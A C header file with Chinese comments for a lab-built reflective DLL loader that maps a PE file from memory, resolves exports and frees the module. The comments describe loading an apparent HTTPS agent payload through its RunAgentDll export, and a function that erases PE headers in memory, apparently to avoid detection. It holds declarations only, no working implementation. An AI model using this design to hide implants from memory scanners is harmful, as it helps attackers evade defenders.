#ifndef MEMORY_MODULE_PP_LITE_H
#define MEMORY_MODULE_PP_LITE_H

#include <windows.h>
#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * 文件作用：MemoryModulePP_Lite 的公开接口。
 *
 * 这是本实验为了适配 MinGW 工具链写的 MemoryModulePP 风格学习版：
 * - 接口命名和使用方式贴近 MemoryModulePP：从内存加载 DLL、查导出函数、释放模块。
 * - 实现重点放在本轮 direct_https DLL 需要的 PE 加载步骤：映射节、重定位、修复导入表、设置节权限、调用入口点。
 * - 当前已补齐 x64 异常函数表注册，用来支持 MinGW/C++ DLL 在内存映射后正常展开异常/栈回溯。
 * - 仍不包含上游 MemoryModulePP 的完整高级特性，例如 Ldr 链表伪装、完整 TLS 管理、引用计数等。
 */

typedef struct MMPP_LITE_MODULE* HMEMORYMODULEPP_LITE;

/*
 * MmpLiteLoadLibraryFromMemory
 *
 * 输入：一整块 DLL 原始文件字节，也就是磁盘上的 PE 文件内容。
 * 输出：一个内存模块句柄。后续用这个句柄查导出函数、释放模块。
 *
 * 它做的事情类似 Windows 的 LoadLibrary，但来源不是 “C:\xxx.dll” 路径，
 * 而是当前进程里的一段内存。内部会完成：
 * - 校验 MZ/PE；
 * - VirtualAlloc 映像空间；
 * - 复制 PE headers 和 sections；
 * - 修复 relocation；
 * - 修复 import table；
 * - 注册 x64 exception table；
 * - 设置 section 权限；
 * - 执行 TLS callbacks；
 * - 调用 DllMain(DLL_PROCESS_ATTACH)。
 */
HMEMORYMODULEPP_LITE MmpLiteLoadLibraryFromMemory(const void* data, size_t size);

/*
 * MmpLiteGetProcAddress
 *
 * 输入：MmpLiteLoadLibraryFromMemory 返回的模块，以及导出函数名。
 * 输出：导出函数地址。
 *
 * 本实验用它查找 direct_https DLL 导出的 RunAgentDll，然后调用它进入 AgentMain。
 */
FARPROC MmpLiteGetProcAddress(HMEMORYMODULEPP_LITE module, const char* name);

/*
 * MmpLiteFreeLibrary
 *
 * 释放手动映射的 DLL：调用 TLS detach/DllMain detach、注销 x64 exception table、
 * FreeLibrary 导入模块、VirtualFree 映像内存。
 *
 * 注意：direct_https agent 正常是长期运行循环，通常不会主动走到释放阶段；
 * 但保留释放逻辑有助于测试 sleep-only 或短生命周期 payload。
 */
void MmpLiteFreeLibrary(HMEMORYMODULEPP_LITE module);

/* 返回最近一次失败的文字原因，方便 loader 写入诊断日志。 */
const char* MmpLiteLastErrorString(void);

/*
 * MmpLiteScrubPeHeaders
 *
 * 在 DLL 已经手动映射成功、且调用方已经通过 MmpLiteGetProcAddress()
 * 找到所需导出函数后，对映射后内存中的 PE header 做最小变量实验。
 *
 * mode 约定：
 * - 0：不处理；
 * - 1：只清理 DOS header 的 "MZ" 两字节；
 * - 2：清理 DOS "MZ" + NT header 的 "PE\0\0" signature；
 * - 3：只清理 section header table；
 * - 4：只清理一组非运行关键 data directory 项（只改 OptionalHeader 目录项，不清 IAT/表体）；
 * - 5：清理完整 PE headers（0 .. SizeOfHeaders）。
 *
 * 注意：此函数是实验用 observability/单变量开关，不是完整隐蔽加载方案。
 */
int MmpLiteScrubPeHeaders(HMEMORYMODULEPP_LITE module, int mode);

#ifdef __cplusplus
}
#endif

#endif
